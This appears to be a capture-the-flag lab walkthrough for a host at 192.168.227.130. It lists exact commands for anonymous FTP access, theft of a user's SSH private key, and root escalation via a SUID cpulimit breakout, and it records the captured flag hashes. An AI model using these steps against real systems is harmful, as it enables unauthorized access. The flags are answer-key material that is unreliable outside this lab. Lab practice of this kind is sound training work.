# Given

ip: 192.168.227.130

# Steps

### Initial Foothold

1. Nmap scan `nmap -sSCV {ip} -oN nmap.out`
2. Since ftp allows anon logins, use `ftp {ip}` and use `anonymous:anonymous` as the creds
3. List directories to find a folder called `.hannah` . There’s an `id_rsa` file inside
4. Download the file to the attack host
5. Give R/RW permissions to the rsa file `chmod 600 id_rsa`
6. Use this to sign in as hannah `ssh hannah@{ip} -i id_rsa`

### Privilege Escalation to Root

1. Do manual enum or linpeas (linpeas has TMI)
2. If you do `sudo -l` the system asks for a password, so try this instead:
    1. `find / -perm -u=s -type f 2>/dev/null`
3. This gives all the binaries that have SUID permissions that can be run by the user hannah.
4. Look for the binaries that aren’t standard to linux distros. For example `/usr/bin/cpulimit` (or something similar)
5. Searching for that on GTFOBins ([https://gtfobins.github.io/gtfobins/cpulimit/](https://gtfobins.github.io/gtfobins/cpulimit/)) shows you how to break out into root
6. Run `/usr/bin/cpulimit -l 100 -f -- /bin/sh -p` to get root.

# Findings

1. open ports:
    1. tcp 21 (ftp), 61000 (ssh)
    2. ftp anon login allowed
2. Folder called `.hannah` with `id_rsa` file
3. `/usr/bin/cpulimit` can be leveraged to break out into root

# Creds

1. hannah : private key

# Flags

1. local.txt - debb020529e126298612fce43cfba270
2. root.txt - 1bbacf0527e91447a5e63df052b0c834

### Proof

![image.png](attachment:15ce94d1-209b-48a9-8c2d-857f3868ac3d:a370a004-c668-47bc-85e0-3e610b7f9576.png)